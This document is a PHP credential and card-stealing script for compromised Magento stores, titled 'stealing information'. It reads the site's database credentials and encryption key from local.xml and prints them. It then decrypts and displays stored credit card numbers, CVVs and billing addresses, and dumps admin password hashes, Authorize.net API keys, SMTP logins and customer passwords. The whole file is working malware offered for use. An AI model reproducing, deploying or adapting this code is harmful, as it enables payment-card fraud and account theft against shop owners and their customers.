<?php
/*
coder : sohai
*/

@set_time_limit(0);

echo'<head>
<title>MAGENTO - stealing information</title>
</head>
<div id="page-wrap">
<body>
<style type="text/css">
table { width:100%; border-color:#333333;border-width:0pt 1pt; border-style:solid; }
A:Link, A:Visited { color: #999999; text-decoration: none; }
A.no:Link, A.no:Visited { text-decoration: none; }
A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover { color: #666666; background-color:#333333; text-decoration: none; }
input,select,option { font:8pt tahoma;color:#666666;margin:2;border:1px solid #666666; }
textarea { color:#666666;font:verdana bold;border:1px solid ;margin:2; }
.fleft { float:left;text-align:left; }
.fright { float:right;text-align:right; }
#pagebar { font:8pt tahoma;padding:5px; border:3px solid #333333; border-collapse:collapse; }
#pagebar td { vertical-align:top; }
#pagebar p { font:8pt tahoma;}
#pagebar a { font-weight:bold;color:#666666; }
#pagebar a:visited { color:#00CE00; }
#mainmenu { text-align:center; }
#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
#maininfo,.barheader,.barheader2 { text-align:center; }
#maininfo td { padding:3px; }
.barheader { font-weight:bold;padding:5px; }
.barheader2 { padding:5px;border:2px solid #333333; }
.contents,.explorer { border-collapse:collapse;}
.contents td { vertical-align:top; }
.mainpanel { border-collapse:collapse;padding:5px; }
.barheader,.mainpanel table,td { border:1px solid #333333; }
.mainpanel input,select,option { border:1px solid #333333;margin:0; }
input[type="submit"] { border:1px solid #333333; }
input[type="text"] { padding:3px;}
.fxerrmsg { color:red; font-weight:bold; }
#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
#pagebar,.mainpanel,input[type="submit"] { background-color:black; }
.barheader2,input,select,option,input[type="submit"]:hover { background-color:black; }
textarea,.mainpanel input,select,option { background-color:#000000; }
// -->
</style>

<body bgcolor="#ffffff" >

<center>
<br>
<FORM action=""  method="post">
<div align="center">[M A G E N T O] - Stealing Information<br>
<div align="center">coder: sohai & n4KuLa_<br>
<input type="hidden" name="form_action" value="2">
</div>
</div>
';


if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){
    $xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');
    if(isset($xml->global->resources->default_setup->connection)) {
       $connection = $xml->global->resources->default_setup->connection;
       $prefix = $xml->global->resources->db->table_prefix;
       $key = $xml->global->crypt->key; //f8cd1881e3bf20108d5f4947e60acfc1
       require_once $_SERVER['DOCUMENT_ROOT'].'/app/Mage.php';
       
       try {
           $app = Mage::app('default');
           Mage::getSingleton('core/session', array('name'=>'frontend'));
       }catch(Exception $e) { echo 'Message: ' .$e->getMessage()."<br/>\n";}

       if (!mysql_connect($connection->host, $connection->username, $connection->password)){
           print("Could not connect: " . mysql_error());
       }
       mysql_select_db($connection->dbname);
       echo $connection->host."|".$connection->username."|".$connection->password."|".$connection->dbname."| $prefix | $key<br/>\n";

    $crypto = new Varien_Crypt_Mcrypt();
    $crypto->init($key);

    //=========================================================================================================
    $query = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM admin_user where is_active = '1'");
    if (!$query){
          echo "<center><b>Gagal</b></center>";
    }else{
            $site = mysql_fetch_array(mysql_query("SELECT value as website FROM core_config_data WHERE path='web/unsecure/base_url'"));
          echo'<br><br>
                ====================================================================<br>
                                [ Admin FROM website : '.$site['website'].'] <br>
                ====================================================================<br>';
    }
    echo "
    <table border='1' align='center' >
    <tr>
    <td>id</td>
    <td>firstname</td>
    <td>lastname</td>
    <td>email</td>
    <td>username</td>
    <td>password</td>
    </tr>";
        while($vx = mysql_fetch_array($query)) {
        $no = 1;
        $user_id = $vx['user_id'];
        $username = $vx['username'];
        $password = $vx['password'];
        $email = $vx['email'];
        $firstname = $vx['firstname'];
        $lastname = $vx['lastname'];
        echo "<tr><pre><td>$user_id</td><td>$firstname</td><td>$lastname</td><td>$email</td><td>$username</td><td>$password</td></pre></tr>";
        } 
    echo "</table><br>";
    //=========================================================================================================
    $query = mysql_query("SELECT value as user,(SELECT value FROM core_config_data where  path = 'payment/authorizenet/trans_key') as pass FROM core_config_data where path = 'payment/authorizenet/login'");
    if(mysql_num_rows($query) != 0){
        if (!$query){
              echo "<center><b>Gagal</b></center>";
        }else{
              echo'<br><br>
                    ====================================================================<br>
                                    [ Authorizenet ] <br>
                    ====================================================================<br>';
        }
        echo "
        <table border='1' align='center' >
        <tr>
        <td>no</td>
        <td>user</td>
        <td>pass</td>   
        </tr>";
            $no = 1;
            while($vx = mysql_fetch_array($query)) {
            $user = $crypto->decrypt($vx['user']);
            $pass = $crypto->decrypt($vx['pass']);

            
            echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>";
            $no++;
            } 
        echo "</table><br>";
    }
    //=========================================================================================================
    $query_smtp = mysql_query("SELECT (SELECT a.value FROM core_config_data as a WHERE path = 'system/smtpsettings/host') as host , (SELECT b.value FROM core_config_data as b WHERE path = 'system/smtpsettings/port') as port,(SELECT c.value FROM core_config_data as c WHERE path = 'system/smtpsettings/username') as user ,(SELECT d.value FROM core_config_data as d WHERE path = 'system/smtpsettings/password') as pass FROM core_config_data limit 1,1");
    if(mysql_num_rows($query_smtp) != 0){
        if (!$query_smtp){
              echo "<center><b>Gagal</b></center>";
        }else{
              echo'<br><br>
                    ====================================================================<br>
                                    [ SMTP ] <br>
                    ====================================================================<br>';
        }
        echo "
        <table border='1' align='center' >
        <tr>
        <td>no</td>
        <td>host</td>       
        <td>port</td>
        <td>user</td>
        <td>pass</td>   
        </tr>";
            $no = 1;
            $batas = 0;
            while($rows = mysql_fetch_array($query_smtp)) {
                $smtphost = $rows[0];
                $smtpport = $rows[1];
                $smtpuser = $rows[2];
                $smtppass = $rows[3];
                echo "<tr><pre><td>$no</td><td>$smtphost</td><td>$smtpport</td><td>$smtpuser</td><td>$smtppass</td></pre></tr>";
                $no++;
            }
        echo "</table><br>";
    }
    //=========================================================================================================
    $query = mysql_query("SELECT sfo.updated_at,sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_enc,CONCAT(sfo.cc_exp_month,' |',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' |-| ',billing.email) AS 'Billing Address' FROM sales_flat_quote_payment AS sfo JOIN sales_flat_quote_address AS billing ON billing.quote_id = sfo.quote_id AND billing.address_type = 'billing'");
    $query2 = mysql_query("SELECT sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_status,CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' | ',billing.email) AS 'Billing Address' FROM sales_flat_order_payment AS sfo JOIN sales_flat_order_address AS billing ON billing.parent_id = sfo.parent_id AND billing.address_type = 'billing' where cc_number_enc != ''");
    if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0){
          echo'<br><br>
                ====================================================================<br>
                                [ Credit Card ] <br>
                ====================================================================<br>';
            echo "
            <table border='1' align='left' >
            <tr>
            <td>no</td>
            <td>Date</td>
            <td>Credit Owner</td>
            <td>method</td>
            <td>Credit Number</td>
            <td>Credit Exp</td>
            <td>CVV</td>
            <td>Address</td>
            </tr>";
                $no = 1;
                $batas = 0;
                while($vx = mysql_fetch_array($query)){
                $date = $vx['updated_at'];
                $cc_owner = $vx['cc_owner'];
                $method = $vx['method'];
                $cc_number_enc = $crypto->decrypt($vx['cc_number_enc']);
                $exp = $vx['exp'];      
                $cc_cid_enc = $crypto->decrypt($vx['cc_cid_enc']);  
                $Billing_Address = $vx['Billing Address'];
                echo "<tr><pre><td>$no</td><td>$date</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_enc</td><td>$Billing_Address</td></pre></tr>";
                $batas = $no++;
                }
                
                while($vx2 = mysql_fetch_array($query2)){
                    $batas +=1;
                $cc_owner = $vx2['cc_owner'];
                $method = $vx2['method'];
                $cc_number_enc = $crypto->decrypt($vx2['cc_number_enc']);
                $exp = $vx2['exp'];     
                $cc_cid_status = $crypto->decrypt($vx2['cc_cid_status']);
                $Billing_Address = $vx2['Billing Address'];
                echo "<tr><pre><td>$batas</td><td>$cc_owner</td><td>$method</td><td>$cc_number_enc</td><td>$exp</td><td>$cc_cid_status</td><td>$Billing_Address</td></pre></tr>";
                 $batas++;
                }    
                
            echo "</table><br>";    
    }
    //=========================================================================================================
    $query = mysql_query("SELECT email,value FROM customer_entity_varchar, customer_entity WHERE customer_entity_varchar.entity_id = customer_entity.entity_id and attribute_id=12");
    $query2 = mysql_query("SELECT customer_email,password_hash FROM sales_flat_quote");
    
    
    if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0 ){
        if (!$query){
              echo "<center><b>Gagal</b></center>";
        }else{
              echo'<br><br>
                    ====================================================================<br>
                                    [ Customer ] <br>
                    ====================================================================<br>';
        }
        echo "
        <table border='1' align='center' >
        <tr>
        <td>no</td>
        <td>user</td>
        <td>pass</td>   
        </tr>";
            $no = 1;
            $batas = 0;
            while($vx = mysql_fetch_array($query)) {
                $user = $vx['email'];
                $pass = $vx['value'];
                echo "<tr><pre><td>$no</td><td>$user</td><td>$pass</td></pre></tr>";
                $batas = $no++;
            } 
            
            if(mysql_num_rows($query2) != 0 && ($query2)){
                while($vx2 = mysql_fetch_array($query2)){
                    $user = $vx2['customer_email'];
                    $pass = $crypto->decrypt($vx2['password_hash']);
                    if(!empty($user) && !empty($pass)){ //tampilin ketika datanya itu ada klo gk ada ya jangan di tampiin 
                        $batas +=1;
                        echo "<tr><pre><td>$batas</td><td>$user</td><td>$pass</td></pre></tr>";
                        $batas++;
                    }
                }               
            }
        
        echo "</table><br>";
    }
    //=========================================================================================================
  }
}
function save($format,$data){
    $fp = fopen($format, 'a');
    fwrite($fp, $data);
    fclose($fp);
}
function cekbase64($string){ 
        $decoded = base64_decode($string, true);
        if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $string)) return false;
        if(!base64_decode($string, true)) return false;
        if(base64_encode($decoded) != $string) return false;
        return true;//nilai return 1 jika true
    }
//----untuk decode password ---/
class Varien_Crypt_Mcrypt{
    /**
     * Constuctor
     *
     * @param array $data
     */
    public function __construct()
    {
    }

    /**
     * Initialize mcrypt module
     *
     * @param string $key cipher private key
     * @return Varien_Crypt_Mcrypt
     */
    public function init($key)
    {
        $this->handler = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, '');
        $iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($this->handler), MCRYPT_RAND);
        $maxKeySize = mcrypt_enc_get_key_size($this->handler);

        if (iconv_strlen($key, 'UTF-8')>$maxKeySize) {
            //throw new Varien_Exception('Maximum key size must should be smaller '.$maxKeySize);
            return null;
        }

        mcrypt_generic_init($this->handler, $key, $iv);

        return $this;
    }

    /**
     * Encrypt data
     *
     * @param string $data source string
     * @return string
     */
    public function encrypt($data)
    {
        if (!$this->handler) {
            //throw new Varien_Exception('Crypt module is not initialized.');
            return null;
        }
        if (strlen($data) == 0) {
            return $data;
        }
        return base64_encode(mcrypt_generic($this->handler, $data));
    }

    /**
     * Decrypt data
     *
     * @param string $data encrypted string
     * @return string
     */
    public function decrypt($data)
    {
        if (!$this->handler) {
            //throw new Varien_Exception('Crypt module is not initialized.');
            return null;
        }
        if (strlen($data) == 0) {
            return $data;
        }
        return mdecrypt_generic($this->handler, base64_decode($data));
    }
        
 
    /**
     * Desctruct cipher module
     *
     */
    public function __destruct()
    {
        if ($this->handler) {
            $this->_reset();
        }
    }

    protected function _reset()
    {
        mcrypt_generic_deinit($this->handler);
        mcrypt_module_close($this->handler);
    }
}

?>
